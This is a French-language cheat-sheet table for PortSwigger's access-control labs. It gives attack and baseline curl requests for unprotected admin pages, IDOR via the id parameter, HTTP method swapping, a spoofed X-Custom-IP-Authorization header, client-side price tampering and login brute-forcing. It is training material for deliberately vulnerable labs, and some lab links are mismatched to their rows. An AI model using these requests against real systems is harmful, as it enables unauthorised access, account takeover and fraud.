# Access control

Voici un tableau synthétique pour l’analyse et la découverte des failles d’**Access Control** (contrôle d’accès) sur les labs PortSwigger, **avec des commandes curl différenciées pour l’attaque et l’analyse** selon chaque cas, des charges utiles neutres, et des explications claires en français :

| Type / Lab                                   | Payload d’attaque neutre (exemple)                | Commande d’attaque (curl)                                                                                  | Commande(s) d’analyse curl                                                                                 | Élément d’analyse (raison préalable)                      | Méthodologie détaillée de découverte                                                                                   | URL PortSwigger ou source utile                                      |
|-----------------------------------------------|---------------------------------------------------|------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------|
| Fonctionnalité admin non protégée             | Accès direct à /admin                             | curl -i "https://LAB/admin"                                                                               | curl -i "https://LAB/"                                                                                     | Accès à une page ou fonctionnalité normalement réservée   | Tentez d’accéder directement à une URL ou une action réservée aux admins sans être authentifié ou avec un compte standard. Si l’accès est accordé, la faille est présente. | https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality |
| Contrôle d’accès basé sur l’ID utilisateur    | Modification d’un paramètre userId                | curl -i "https://LAB/my-account?id=2" --cookie "session=..."                                              | curl -i "https://LAB/my-account?id=1" --cookie "session=..."                                               | Accès ou modification de données d’un autre utilisateur   | Modifiez l’identifiant utilisateur dans l’URL ou les paramètres pour accéder ou modifier les données d’un autre compte. Comparez avec une requête standard. | https://portswigger.net/web-security/access-control/lab-user-id-parameter |
| Contrôle d’accès via méthode HTTP             | Utilisation d’une méthode HTTP non prévue         | curl -X PUT -i "https://LAB/admin/delete?user=carlos" --cookie "session=..."                               | curl -X GET -i "https://LAB/admin/delete?user=carlos" --cookie "session=..."                               | Action critique accessible via une méthode inattendue      | Essayez différentes méthodes HTTP (PUT, DELETE, etc.) sur les endpoints critiques. Si l’action est acceptée, la faille est confirmée. | https://portswigger.net/web-security/access-control/lab-method-based-access-control |
| Contrôle d’accès par entête personnalisé      | Ajout d’un header spécial (ex: X-Custom-IP-Authorization) | curl -i -H "X-Custom-IP-Authorization: 127.0.0.1" "https://LAB/admin"                                      | curl -i "https://LAB/admin"                                                                                | Bypass du contrôle d’accès via un header                  | Ajoutez un header spécifique découvert dans la documentation ou par fuzzing (ex: X-Custom-IP-Authorization). Si l’accès est accordé, la faille est présente. | https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass |
| Contrôle d’accès basé sur la confiance côté client | Modification d’un paramètre caché ou JS           | curl -i -d "product_id=1&price=1" "https://LAB/cart" --cookie "session=..."                               | curl -i -d "product_id=1&price=99" "https://LAB/cart" --cookie "session=..."                               | Modification d’un prix ou d’un paramètre sensible         | Modifiez un paramètre caché ou transmis côté client (ex: prix dans un panier). Comparez la réponse avec la valeur attendue. | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls |
| Contrôle d’accès avec brute-force ou logique  | Test de workflow ou de limitation                 | curl -i -X POST -d "username=carlos&password=essai" "https://LAB/login"                                   | curl -i -X POST -d "username=wiener&password=peter" "https://LAB/login"                                    | Contournement de limitation ou workflow                   | Testez la logique d’authentification ou de workflow (ex: brute-force, reset, etc.) pour détecter une faille de contrôle d’accès. | https://portswigger.net/web-security/access-control/lab-vertical-privilege-escalation |

---

